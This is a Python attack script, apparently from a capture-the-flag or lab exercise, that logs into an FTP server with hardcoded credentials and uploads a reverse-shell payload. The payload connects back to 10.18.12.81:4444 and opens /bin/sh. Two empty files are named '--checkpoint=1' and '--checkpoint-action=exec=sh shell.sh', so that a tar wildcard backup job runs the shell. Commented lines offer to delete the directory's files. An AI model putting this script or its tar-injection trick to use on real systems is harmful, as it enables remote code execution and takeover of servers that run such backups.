from ftplib import FTP
import io

with FTP(host='172.20.0.1') as ftp:
    print(str(ftp.getwelcome()))
    try:
        ftp.login(user='backupmgr', passwd='SuperS1ckP4ssw0rd123!')
        print("[+] Login successful!")
        ftp.set_pasv(False)
        print("[+] Mode set to \"active\"")
        print("[*] Working directory: " + str(ftp.pwd()))
        print("[*] Listing directory")
        ftp.dir()
        print("[*] Trying to change into the  \"files\" directory.")
        ftp.cwd('files')
        print("[+] Successfully changed directory!")

        # Want to Delete files in this directory?
        #ftp.delete('')
        #print("[+] Deleted the files.")

        # Now we want to create the payloads and upload everything!
        print("[*] Trying to create the files!")
        shell = io.BytesIO(b'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.12.81",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'')
        emptyFile = io.BytesIO(b'')
        ftp.storlines('STOR shell.sh', shell)
        ftp.storlines('STOR --checkpoint=1', emptyFile)
        ftp.storlines('STOR --checkpoint-action=exec=sh shell.sh', emptyFile)
        print("[+] Success!")


        print("[*] These files are now in the directory \"" + str(ftp.pwd()) + "\"")
        ftp.dir()

        # Want to check if the payload is correct?
        #print("Payload:\n")
        #print(str(ftp.retrlines("RETR shell.sh")))

        print("[+] Closing FTP connection")
        ftp.quit()


    except Exception as e:
        print('FTP error: ', e)